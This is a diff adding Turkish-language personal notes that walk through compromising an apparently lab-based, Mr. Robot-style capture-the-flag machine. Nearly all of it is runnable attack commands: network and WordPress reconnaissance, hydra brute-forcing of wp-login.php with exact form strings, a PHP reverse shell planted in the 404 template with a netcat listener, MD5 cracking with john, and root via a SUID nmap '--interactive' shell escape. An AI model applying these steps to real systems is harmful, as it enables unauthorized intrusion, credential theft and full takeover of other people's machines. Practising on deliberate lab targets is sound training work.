@@ -1,0 +1,57 @@
+netdiscover hedef mak adresi
+ifconfig  ip adresim ne
+nmap version ttaramasi  nmap -Pn -sV 192.168.189.129
+80 de ne var tarayicidan bak
+dirb http://192.168.189.129    url de ne var acik pathlere bakiyor siteadi/admin vs gibi
+wordpress varsa wpscan --url 192.168.189.129
+robot.txt de indeclenmesini istemedigin pathler buraya yazilir arama motoru gostermez
+**dosya tasima mv `tasinacak seyin adi` `tasinacak yeni yeri`
+**ls -lah  komutu dosyanin boyutu yetkileride gosterir
+**wc -l fsocity.dic    satir sayisi gosterir
+**cat `text velgesi adi`  text acar
+**head fsocity.dic	sadece ilk 10 satiri gosterir
+**birbirini tekrar eden satirlari cikarir sort -u fsocity.dic | uniq >> yeni.txt
+/wp-admin   wordpress te admin ekrani
+wordpress user arama komutu wpscan --url 192.168.189.129 --enumerate u   (u userleri arar p harfi ise pluginler )
+
+hydra brute force araci kelime saldirisi araci
+once foxyproxyi aktif hale getir ardindan wp-admin panelinden get kodunu burp programindan çek
+hydra komutu useri bulmak icin kod hydra -vV -L yeni.txt -p 1234 192.168.189.129 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+useri buldun pass icin
+hydra -vV -l elliot -P yeni.txt 192.168.189.129 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+panelden sonra iceriden shell alacagiz makineyi ele gecirmek icin
+404 dosyasina kendi kodumuzu aticaz
+php reverse shell yazip indiriyoruz belgeyi ardindan 404 e cakiyoruz ama kendi ipmizi oraya yaziyoruz reverse shelle
+nc -lvp 1234   kodu ile dinlemeye aliyoruz
+ardindan hedef makina not found hatasi verdirdiginde sheli almis oluyoruz
+python -c 'import pty;pty.spawn("/bin/bash")' rahat hareket etmek icin demis
+sonra ls atiyoruz kok dizini gorunutuluyoruz
+whoami   komutu ile hangi kullanici oldugumuza bakiyoruz
+id   komutu id mizi gosterir
+uname -a  isletim sistemini gosteriyor
+
+locate belge buluyor  locate rockyou.txt
+
+text olusturma touch hash 
+echo 'c3fcd3d76192e4007dfb496cca67e13b' >> hash      text icine yaziyor
+cat hash              text dosyasini aciyor
+
+john -format=raw-MD5 hash -wordlist=/usr/share/wordlists/rockyou.txt   md5 hashini deniyor wordlistten
+burdan sifreyi alip
+su robot ardindan istedigi sifre yazilir
+
+find / -perm -4000 -type f 2>/dev/null         bu kodla root seviyesinde calisan programlari listeler.
+
+/usr/local/bin/nmap --interactive   programi calistirdik
+!sh   komutu ile shellimizi aldik  grup yukselttik
+
+
+euid=0 roottur
+
+
+
+
+
+
+
+
